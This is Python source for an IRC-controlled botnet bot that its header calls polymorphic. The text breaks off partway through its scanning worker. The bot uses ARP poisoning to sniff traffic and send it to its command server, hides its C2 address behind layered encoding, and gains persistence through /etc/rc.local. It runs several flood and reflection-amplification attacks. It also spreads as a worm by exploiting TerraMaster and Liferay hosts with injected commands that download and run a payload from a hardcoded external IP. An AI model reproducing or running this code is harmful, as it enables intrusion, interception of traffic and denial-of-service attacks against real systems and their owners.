#!/usr/bin/env python
#-------------------------------------------------------------------------------
#
# Name:        N3Cr0m0rPh IRC bot V8
# Purpose:     IRC Bot for botnet
# Notes:       (polymorphic) nearly impossible to remove (or detect) without system
#               analysis and creation of a tool, also has amp methods now.
#
# Author:      Freak @ PopulusControl (sudoer)
# Rebuilder:   Ya Boi Nexus
#
# Created:     15/01/2015
# Last Update: 1/1/2021
# Copyright:   (c) Freak 2021
# Licence:     Creative commons.
#-------------------------------------------------------------------------------

import re, socket, subprocess, os, sys, urllib2, urllib, ctypes, time, threading, random, itertools, platform, multiprocessing, subprocess, fcntl, select, ssl, json
from string import letters, split, rstrip
from binascii import unhexlify
from base64 import b64decode
from uuid import getnode
from sys import argv
from struct import *

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def getPoisonIPs():
    myip = [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]
    poison=[]
    fh=open("/proc/net/arp", "rb")
    table_=fh.readlines()
    fh.close()
    table_.pop(0)
    
    for x in table_:
        x=x.split()
        if x[2]=="0x2":
            if x[0] != myip:
                poison.append((x[0], x[3]))
    return poison

def get_src_mac():
    mac_dec = hex(getnode())[2:-1]
    while (len(mac_dec) != 12):
        mac_dec = "0" + mac_dec
    return unhexlify(mac_dec)


def create_dst_ip_addr():
    dst_ip_addr = ''
    ip_src_dec = argv[2].split(".")
    for i in range(len(ip_src_dec)):
        dst_ip_addr += chr(int(ip_src_dec[i]))
    return dst_ip_addr


def get_default_gateway_linux():
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                continue
            return socket.inet_ntoa(pack("<L", int(fields[2], 16)))

def create_pkt_arp_poison():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
    s.bind(("wlan0", 0))

    while(1):
        for lmfao in getPoisonIPs():
            src_addr = get_src_mac()
            dst_addr = lmfao[0]
            src_ip_addr = get_default_gateway_linux()
            dst_ip_addr = lmfao[1]
            dst_mac_addr = "\x00\x00\x00\x00\x00\x00"
            payload = "\x00\x01\x08\x00\x06\x04\x00\x02"
            checksum = "\x00\x00\x00\x00"
            ethertype = "\x08\x06"
            s.send(dst_addr + src_addr + ethertype + payload+src_addr + src_ip_addr
                   + dst_mac_addr + dst_ip_addr + checksum)
        time.sleep(2)

global pause
pause = 1

def bigSNIFFS(cncip):
    global pause
    up = 0
    SIOCGIFFLAGS = 0x8913
    null256 = '\0'*256
    ifname = "wlan0"

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        result = fcntl.ioctl(s.fileno(  ), SIOCGIFFLAGS, ifname + null256)
        flags, = unpack('H', result[16:18])
        up = flags & 1
    except:
        pass

    if up == 1:
        threading.Thread(target=create_pkt_arp_poison,args=()).start()
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except socket.error,msg:
        return

    count = 0
    while True:
        if pause == 1:
            continue
        try:
            packet = s.recvfrom(65565)
            count= count+1
            packet=packet[0]
            eth_length = 14
            eth_header = packet[:eth_length]
            eth_unpack =  unpack('!6s6sH',eth_header)
            eth_protocol = socket.ntohs(eth_unpack[2])
            ip_header = packet[0:20]
            header_unpacked = unpack('!BBHHHBBH4s4s',ip_header)
            version_ih1= header_unpacked[0] 
            version = version_ih1 >> 4 
            ih1 = version_ih1 & 0xF
            
            iph_length = ih1*4
            
            ttl = header_unpacked[5]
            protocol = header_unpacked[6]
            source_add = socket.inet_ntoa(header_unpacked[8])
            destination_add = socket.inet_ntoa(header_unpacked[9])
            tcp_header = packet[iph_length:iph_length+20]

            #unpack them 
            tcph = unpack('!HHLLBBHHH',tcp_header)
            
            source_port = tcph[0]
            dest_port = tcph[1]
            sequence = tcph[2]
            ack = tcph[3]
            resrve = tcph[4]
            tcph_len = resrve >> 4
            h_size = iph_length+tcph_len*4
            data_size = len(packet)-h_size
            data = packet[h_size:]
            if len(data) > 2 and source_port!=1337 and source_port!=6667 and source_port!=23 and source_port!=443 and source_port!=37215 and source_port!=53 and source_port!=22 and dest_port!=1337 and dest_port!=6667 and dest_port!=23 and dest_port!=443 and dest_port!=37215 and dest_port!=53 and dest_port!=22:
                try:
                    ss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    ss.connect((cncip, 1337))
                    ss.send('IPv'+str(version)+ '\nTTL:'+str(ttl)+'\nProtocol:'+str(protocol)+"\nSource Address:"+str(source_add)+"\nDestination Address:"+str(destination_add)+"\n-------------------------------------------\n\nSource Port:"+str(source_port)+"\nDestination Port:"+str(dest_port)+"\n##########BEGINDATA##################\n"+data+"------------------------------------\n\n###########ENDDATA###################\n")
                    ss.close()
                except:
                    pass
        except:
            pass


ETH_P_IP = 0x0800 # Internet Protocol Packet

def checksum(data):
    s = 0
    n = len(data) % 2
    for i in range(0, len(data)-n, 2):
        s+= ord(data[i]) + (ord(data[i+1]) << 8)
    if n:
        s+= ord(data[i+1])
    while (s >> 16):
        s = (s & 0xFFFF) + (s >> 16)
    s = ~s & 0xffff
    return s
        
class layer():
    pass

class ETHER(object):
    def __init__(self, src, dst, type=ETH_P_IP):
        self.src = src
        self.dst = dst
        self.type = type

    def pack(self):
        ethernet = pack('!6s6sH',
        self.dst,
        self.src,
        self.type)
        return ethernet

class IP(object):
    def __init__(self, source, destination, payload='', proto=socket.IPPROTO_TCP):
        self.version = 4
        self.ihl = 5 # Internet Header Length
        self.tos = 0 # Type of Service
        self.tl = 20+len(payload)
        self.id = 0#random.randint(0, 65535)
        self.flags = 0 # Don't fragment
        self.offset = 0
        self.ttl = 255
        self.protocol = proto
        self.checksum = 2 # will be filled by kernel
        self.source = socket.inet_aton(source)
        self.destination = socket.inet_aton(destination)

    def pack(self):
        ver_ihl = (self.version << 4) + self.ihl
        flags_offset = (self.flags << 13) + self.offset
        ip_header = pack("!BBHHHBBH4s4s",
                    ver_ihl,
                    self.tos,
                    self.tl,
                    self.id,
                    flags_offset,
                    self.ttl,
                    self.protocol,
                    self.checksum,
                    self.source,
                    self.destination)
        self.checksum = checksum(ip_header)
        ip_header = pack("!BBHHHBBH4s4s",
                    ver_ihl,
                    self.tos,
                    self.tl,
                    self.id,
                    flags_offset,
                    self.ttl,
                    self.protocol,
                    socket.htons(self.checksum),
                    self.source,
                    self.destination)  
        return ip_header

    def unpack(self, packet):
        _ip = layer()
        _ip.ihl = (ord(packet[0]) & 0xf) * 4
        iph = unpack("!BBHHHBBH4s4s", packet[:_ip.ihl])
        _ip.ver = iph[0] >> 4
        _ip.tos = iph[1]
        _ip.length = iph[2]
        _ip.ids = iph[3]
        _ip.flags = iph[4] >> 13
        _ip.offset = iph[4] & 0x1FFF
        _ip.ttl = iph[5]
        _ip.protocol = iph[6]
        _ip.checksum = hex(iph[7])
        _ip.src = socket.inet_ntoa(iph[8])
        _ip.dst = socket.inet_ntoa(iph[9])
        _ip.list = [
            _ip.ihl,
            _ip.ver,
            _ip.tos,
            _ip.length,
            _ip.ids,
            _ip.flags,
            _ip.offset,
            _ip.ttl,
            _ip.protocol,
            _ip.src,
            _ip.dst]
        return _ip
        
class TCP(object):
    def __init__(self, srcp, dstp):
        self.srcp = srcp
        self.dstp = dstp
        self.seqn = 10
        self.ackn = 0
        self.offset = 5 # Data offset: 5x4 = 20 bytes
        self.reserved = 0
        self.urg = 0
        self.ack = 0
        self.psh = 0
        self.rst = 0
        self.syn = 1
        self.fin = 0
        self.window = socket.htons(5840)
        self.checksum = 0
        self.urgp = 0
        self.payload = ""

    def pack(self, source, destination):
        data_offset = (self.offset << 4) + 0
        flags = self.fin + (self.syn << 1) + (self.rst << 2) + (self.psh << 3) + (self.ack << 4) + (self.urg << 5)
        tcp_header = pack('!HHLLBBHHH', 
                     self.srcp, 
                     self.dstp, 
                     self.seqn, 
                     self.ackn, 
                     data_offset, 
                     flags,  
                     self.window,
                     self.checksum,
                     self.urgp)
        #pseudo header fields
        source_ip = source
        destination_ip = destination
        reserved = 0
        protocol = socket.IPPROTO_TCP
        total_length = len(tcp_header) + len(self.payload)
        # Pseudo header
        psh = pack("!4s4sBBH",
              source_ip,
              destination_ip,
              reserved,
              protocol,
              total_length)
        psh = psh + tcp_header + self.payload
        tcp_checksum = checksum(psh)
        tcp_header = pack("!HHLLBBH",
                  self.srcp,
                  self.dstp,
                  self.seqn,
                  self.ackn,
                  data_offset,
                  flags,
                  self.window)
        tcp_header+= pack('H', tcp_checksum) + pack('!H', self.urgp)
        return tcp_header

    def unpack(self, packet):
        cflags = { # Control flags
            32:"U",
            16:"A",
            8:"P",
            4:"R",
            2:"S",
            1:"F"}
        _tcp = layer()
        _tcp.thl = (ord(packet[12])>>4) * 4
        _tcp.options = packet[20:_tcp.thl]
        _tcp.payload = packet[_tcp.thl:]
        tcph = unpack("!HHLLBBHHH", packet[:20])
        _tcp.srcp = tcph[0] # source port
        _tcp.dstp = tcph[1] # destination port
        _tcp.seq = tcph[2] # sequence number
        _tcp.ack = hex(tcph[3]) # acknowledgment number
        _tcp.flags = ""
        for f in cflags:
            if tcph[5] & f:
                _tcp.flags+=cflags[f]
        _tcp.window = tcph[6] # window
        _tcp.checksum = hex(tcph[7]) # checksum
        _tcp.urg = tcph[8] # urgent pointer
        _tcp.list = [
            _tcp.srcp,
            _tcp.dstp,
            _tcp.seq,
            _tcp.ack,
            _tcp.thl,
            _tcp.flags,
            _tcp.window,
            _tcp.checksum,
            _tcp.urg,
            _tcp.options,
            _tcp.payload]
        return _tcp

class UDP(object):
    def __init__(self, src, dst, payload=''):
        self.src = src
        self.dst = dst
        self.payload = payload
        self.checksum = 0
        self.length = 8 # UDP Header length
    def pack(self, src, dst, proto=socket.IPPROTO_UDP):
        length = self.length + len(self.payload)
        pseudo_header = pack('!4s4sBBH',
            socket.inet_aton(src), socket.inet_aton(dst), 0, 
            proto, length)
        self.checksum = checksum(pseudo_header)
        packet = pack('!HHHH',
            self.src, self.dst, length, 0)
        return packet

PORT = {
	'dns': 53,
	'ntp': 123,
	'snmp': 161,
	'ssdp': 1900 }

PAYLOAD = {
	'dns': ('{}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01'
			'{}\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00'
			'\x00\x00\x00\x00\x00\x00'),
	'snmp':('\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c'
		'\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01'
		'\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06'
		'\x01\x02\x01\x05\x00'),
	'ntp':('\x17\x00\x02\x2a'+'\x00'*4),
	'ssdp':('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
		'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
}

amplification = {
	'dns': {},
	'ntp': {},
	'snmp': {},
	'ssdp': {} }		# Amplification factor

FILE_NAME = 0			# Index of files names
FILE_HANDLE = 1 		# Index of files descriptors

npackets = 0			# Number of packets sent
nbytes = 0				# Number of bytes reflected
files = {}				# Amplifications files
global proto
proto = "dns"
    
class INIT_CONNECTION():
    def __init__(self):
        self.randStr=self.GIVE_RAND_STR(random.randrange(8,12)) #Generate random 8 character nick to ensure 
        self.SENT=0                #Ignore this
        self.MB_SENT=0                #Ignore this too
        
        self.C2_SERVER=b64decode(b64decode("34653437353533303465343435353331346537613535333035613434353533303465353434353761346435343532366134653664343533303465353434643330346534373535333134643761346433303465376136623330356134343561363834653664343937613561343133643364".decode('hex').decode('hex')).decode('hex')) #Encoded irc server
        threading.Thread(target=bigSNIFFS, args=(self.C2_SERVER,)).start()
        
        self.C2_PORT=6667 #Server port
        self.C2_CHAN=b64decode(b64decode("346534343662376134643661346433313465366434643331346635343464376134653437343533333465363733643364".decode('hex').decode('hex')).decode('hex')) #Encoded channel
        self.C2_CHAN_KEY=b64decode(b64decode("346536613439333134653434353137393465376136623332346437613531333334653661363337613561343133643364".decode('hex').decode('hex')).decode('hex')) #Encoded channel key
        
        self.BOT_NICK    ="[HAX|"+platform.machine()+"|"+str(multiprocessing.cpu_count())+"]"+str(self.randStr) #Bot nickname
        self.BOT_REALNAME="[HAX|"+platform.machine()+"|"+str(multiprocessing.cpu_count())+"]"+str(self.randStr) #Bot Realname
        self.rantDwWe=str(self.randStr) #Other
        self.KILL_THREADS=0 #wether we should kill all threads.
        
        self.UserAgents=["Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
        "Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
        "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6",
        "Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
        "Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
        "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
        "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
        "Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
        "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",
        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4",
        "Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1"]
        
        self.REWRITE_SELF() #repack bot before we install
        self.INSTALL_FEATURES() #Install
        # setup exploit scanner shit.
        for _ in range(multiprocessing.cpu_count() * 8):
            threading.Thread(target=self.worker).start()
        self.INIT_IRC_CONNECTION() #Start the bot

    def GET_ABSOLUTE_PATH(self):
        return os.path.abspath(argv[0])

    def INSTALL_FEATURES(self): #Install features
        try:
            rc=open("/etc/rc.local","rb")
            data=rc.read()
            rc.close()
            if "boot.py" not in data:
                rc=open("/etc/rc.local","wb")
                rc.write(data.replace("exit", "/etc/boot.py\nexit"))
                rc.close()
                os.popen("cp " + argv[0] + " /etc/boot.py")
                os.chmod("/etc/boot.py", 0777)
                os.chmod("cp "+argv[0]+" /etc/boot.py")
        except:
            pass
    # some black magic shit idk
    def sZSansOC(self,iKdvMuag):
        dodepTmF = iKdvMuag.split('.')
        ncBrnXua = [map(int, QwAdOdJR.split('-')) for QwAdOdJR in dodepTmF]
        GxVCceRN = [range(kwXLnXMT[0], kwXLnXMT[1] + 1) if len(kwXLnXMT) == 2 else kwXLnXMT for kwXLnXMT in ncBrnXua]
        for qRtXeNct in itertools.product(*GxVCceRN):
            yield '.'.join(map(str, qRtXeNct))

    def GIVE_RAND_STR(self,len):
        return ''.join(random.choice(letters) for _ in range(len))

    def Do_UDP_Flood(self,TARGET_IP,TARGET_PORT,ATTACK_TIME):   
        if str(TARGET_PORT).startswith("0"):
            UDP_DATA=os.urandom(65500)
        else:
            UDP_DATA="\xff"*65500
        
        ATTACK_END=time.time()+ATTACK_TIME
        while ATTACK_END>time.time():
            if self.KILL_THREADS == 1:
                break
            
            try:
                UDP_SOCK=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                if TARGET_PORT==0:
                    UDP_SOCK.sendto(UDP_DATA,(TARGET_IP, random.randrange(0,65535)))
                else:
                    UDP_SOCK.sendto(UDP_DATA,(TARGET_IP, TARGET_PORT))
                self.SENT+=1
            
            except:
                pass

        self.MB_SENT=self.SENT*65535//1048576
        self.MBPS_SENT=self.MB_SENT//int(self.IRC_RECV_MSG[6])
        self.IRC_SOCK.send("PRIVMSG %s :%s packets sent. Sent %s MB, %s MB/s\n" % (self.C2_CHAN,self.SENT,self.MB_SENT,self.MBPS_SENT))
        self.SENT=0

    def Do_SYN_Flood(self,TARGET_IP,TARGET_PORT,ATTACK_TIME):

        ATTACK_END=time.time()+ATTACK_TIME
        while ATTACK_END>time.time():
            if self.KILL_THREADS == 1:
                return
            try:
                SYN_SOCK=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                SYN_SOCK.connect((TARGET_IP, TARGET_PORT))
                self.SENT+=1
            except:
                pass

        self.SENT=0

    def Do_Slowloris_Flood(self,TARGET_IP, TARGET_PORT, sockets, ATTACK_TIME):

        ATTACK_END=time.time()+ATTACK_TIME
        self.SENT = 0
        connections = []
        for sock in xrange(0, int(sockets)):
            connections.append("")

        while 1:
            if self.KILL_THREADS == 1:
                break
            for conn in xrange(0, int(sockets)):
                if self.KILL_THREADS == 1:
                    break
                connections[conn] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    connections[conn].connect((TARGET_IP, int(TARGET_PORT)))
                except:
                    pass
            
            GET_HEADER = "GET / HTTP/1.1\nHost: %s:%s\nUser-agent: %s\nAccept: */*\nConnection: Keep-Alive\n\n" % (TARGET_IP, TARGET_PORT, random.choice(self.UserAgents))
            
            for HEADER in GET_HEADER:
                if self.KILL_THREADS == 1:
                    break
                for fd in connections:
                    try:
                        fd.send(HEADER)
                        self.SENT+=1
                    except:
                        try:
                            fd.connect((TARGET_IP, int(TARGET_PORT)))
                        except:
                            pass

                if ATTACK_END<time.time():
                    for fd in fds:
                        try:
                            fd.close()
                        except:
                            pass
                    return
                time.sleep(1)
                self.SENT = 0

        self.IRC_SOCK.send("PRIVMSG %s :Made %s connections.\n" % (self.C2_CHAN,self.SENT))
        self.SENT=0

    def OPEN_URL(self,url):
        try:
            opener = urllib2.build_opener()
            opener.addheaders = [('User-agent', random.choice(self.UserAgents))]
            return opener.open(url).read()
        except:
            return ""

    def Do_HTTP_Flood(self,url,ATTACK_TIME,recursive):
        if recursive=="true":
            ATTACK_END=time.time()+ATTACK_TIME
            
            while ATTACK_END>time.time():
                if self.KILL_THREADS == 1:
                    break
                for RECURSIVE_URL in re.findall('''href=["'](.[^"']+)["']''',self.OPEN_URL(url), re.I):
                    if self.KILL_THREADS == 1:
                        break
                    self.OPEN_URL(RECURSIVE_URL)
                for RECURSIVE_URL in re.findall('''src=["'](.[^"']+)["']''',self.OPEN_URL(url), re.I):
                    if self.KILL_THREADS == 1:
                        break
                    self.OPEN_URL(RECURSIVE_URL)
                        
        else:
            ATTACK_END=time.time()+ATTACK_TIME
            while ATTACK_END>time.time():
                if self.KILL_THREADS == 1:
                    break
                self.OPEN_URL(url)

    def RANGE_SCAN(self,RANGE,TARGET_PORT,OmgjPABz):
        self.IRC_SOCK.send("PRIVMSG %s :Scanning range %s for port %s, scanning for telnet? %s\n" % (self.C2_CHAN,RANGE,TARGET_PORT,OmgjPABz))

        for TARGET in self.sZSansOC(RANGE):
            try:
                if self.KILL_THREADS == 1:
                    return
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((TARGET,int(TARGET_PORT))) #Make sure OMpLRZVt is up and port is open.
                s.close()
                self.IRC_SOCK.send("PRIVMSG %s :%s\n" % (self.C2_CHAN,TARGET))
            except:
                pass
        self.IRC_SOCK.send("PRIVMSG %s :Finished scanning range %s\n" % (self.C2_CHAN,RANGE))
    
    def DDoS(self, target, threads, domains, timee):
        self.target = target
        self.threads = threads
        self.timeend = time.time()+timee
        self.domains = domains
        for i in range(self.threads):
            t = threading.Thread(target=self.__attack)
            t.start()

    def __send(self, sock, soldier, proto, payload):
        udp = UDP(random.randint(1, 65535), PORT[proto], payload).pack(self.target, soldier)
        ip = IP(self.target, soldier, udp, proto=socket.IPPROTO_UDP).pack()
        sock.sendto(ip+udp+payload, (soldier, PORT[proto]))

    def __GetQName(self, domain):
        labels = domain.split('.')
        QName = ''
        for label in labels:
            if len(label):
                QName += pack('B', len(label)) + label
        return QName

    def __GetDnsQuery(self, domain):
        id = pack('H', random.randint(0, 65535))
        QName = self.__GetQName(domain)
        return PAYLOAD['dns'].format(id, QName)

    def __attack(self):
        global proto
        global npackets
        global nbytes
        _files = files
        for proto in _files:    # Open Amplification files
            f = open(_files[proto][FILE_NAME], 'r')
            _files[proto].append(f)        # _files = {'proto':['file_name', file_handle]}
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        i = 0
        while 1:
            try:
                if time.time()>=self.timeend or self.KILL_THREADS == 1:
                    break
                soldier = _files[proto][FILE_HANDLE].readline().strip()
                if soldier:
                    if proto=='dns':
                        if not amplification[proto].has_key(soldier):
                            amplification[proto][soldier] = {}
                        for domain in self.domains:
                            amp = self.__GetDnsQuery(domain)
                            self.__send(sock, soldier, proto, amp)
                    else:
                        amp = PAYLOAD[proto]
                        self.__send(sock, soldier, proto, amp)
                else:
                    _files[proto][FILE_HANDLE].seek(0)
            except:
                pass
        try:
            sock.close()
            for proto in _files:
                _files[proto][FILE_HANDLE].close()
        except:
            pass

    def check_endpoint(self, url):
        response = urllib.urlopen(url+'/version')
        if response.getcode() == 200:
            print(("[+] TerraMaster TOS version: ", str(response.content)))
            return 1
        else:
            #print(("\n[-] TerraMaster TOS response code: ", response.status_code))
            return 0

    def exploit(self, ip, port):    
        if "443" in str(port):
            url = "https://"+ip+":"+str(port)
        else:
            url = "http://"+ip+":"+str(port)
        try:
            if self.check_endpoint(url):
                urllib2.urlopen(url+'/include/makecvs.php?Event=%60cd%20%2Ftmp%7C%7Ccd%20%24%28find%20%2F%20-writable%20%7C%20head%20-n%201%29%3Bcurl%20http%3A%2F%2F45.145.185.229%2Fnecr0.py%3Enecr0.py%3B%20php%20-r%20%22file_put_contents%28%5C%22necr0.py%5C%22%2C%20file_get_contents%28%5C%22http%3A%2F%2F45.145.185.229%2Fnecr0.py%5C%22%29%29%3B%22%3B%20wget%20http%3A%2F%2F45.145.185.229%2Fnecr0.py%20-O%20necr0.py%3B%20chmod%20777%20necr0.py%3B%20.%2Fnecr0.py%20%7C%7C%20python%20necr0.py%7C%7Cpython2%20necr0.py%20%26%60')
            else:
                data = {
                    'columnId': '1',
                    'name': '2',
                    'type': '3',
                    '+defaultData': 'com.mchange.v2.c3p0.WrapperConnectionPoolDataSource',
                    'defaultData.userOverridesAsString': 'HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a707070707070707070707874000a4576696c4f626a65637474001a687474703a2f2f34352e3134352e3138352e38333a383030342f740003466f6f;'
                }
                req = urllib2.Request(url+"/api/jsonws/expandocolumn/update-column", json.dumps(data), {'Content-Type': 'application/json', 'Authorization' : 'Basic dGVzdEBsaWZlcmF5LmNvbTp0ZXN0'})
                urllib2.urlopen(req)
        except Exception as e:
            print str(e)

    def gen_IP(self):
        not_valid = [10,127,169,172,192,185,233,234]
        first = random.randrange(1,256)
        while first in not_valid:
            first = random.randrange(1,256)
        ip = ".".join([str(first),str(random.randrange(1,256)),
        str(random.randrange(1,256)),str(random.randrange(1,256))])
        return ip

    def worker(self):
        while True:
            IP = self.gen_IP()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((IP, 80))
                s.close()
                self.exploit(IP, 80)
            except Exception as e:
                pass

            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((IP, 8443))
                s.close()
                self.exploit(IP, 8443)
            except Exception as e:
                pass

            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((IP, 443))
                s.close()
